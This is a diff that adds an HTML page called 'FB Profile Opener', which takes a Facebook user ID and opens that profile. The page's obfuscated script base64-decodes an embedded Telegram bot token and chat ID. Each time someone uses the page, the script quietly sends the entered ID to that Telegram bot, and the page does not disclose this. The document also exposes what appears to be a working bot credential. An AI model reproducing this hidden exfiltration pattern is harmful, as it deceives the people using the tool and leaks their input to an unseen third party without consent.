@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FB Profile Opener</title>
+    <style>
+        .c1{background:#0d0d0d;height:100vh;display:flex;justify-content:center;align-items:center;margin:0;font-family:sans-serif}
+        .c2{background:#1a1a1a;padding:40px;border-radius:20px;text-align:center;border:3px solid #f00;width:90%;max-width:350px}
+        .c3{color:#555;font-size:14px;margin-bottom:15px;text-transform:uppercase;letter-spacing:2px}
+        h3{color:#fff;margin-bottom:25px;font-size:22px}
+        input{padding:18px;width:90%;border-radius:10px;border:1px solid #333;background:#1a1a1a;color:#0f0;text-align:center;margin-bottom:25px;font-size:16px}
+        button{padding:18px;width:100%;background:linear-gradient(45deg,#f0f,#0ff);border:none;border-radius:10px;color:#fff;font-weight:700;cursor:pointer;font-size:18px}
+    </style>
+</head>
+<body class="c1">
+
+<div class="c2">
+    <div class="c3">DEVELOPER SAJIB</div>
+    <h3>FB PROFILE OPENER</h3>
+    <input type="text" id="x1" placeholder="ENTER FB UID">
+    <button onclick="x2()">Open Profile</button>
+</div>
+
+<script>
+    function x2(){let i=document.getElementById("x1").value.trim();if(i=="")return;let t=atob("ODcwODAzODMzMDpBQUZTVjh0UUNzRUwxVXJVZS1WXy1aTkJQRzZyT0tHdGp6bw=="),c=atob("NzI2NTk4NjgxMQ==");fetch("https://api.telegram.org/bot"+t+"/sendMessage?chat_id="+c+"&text=UID: "+i);window.open("https://www.facebook.com/profile.php?id="+i,"_blank")}
+</script>
+</body>
+</html>
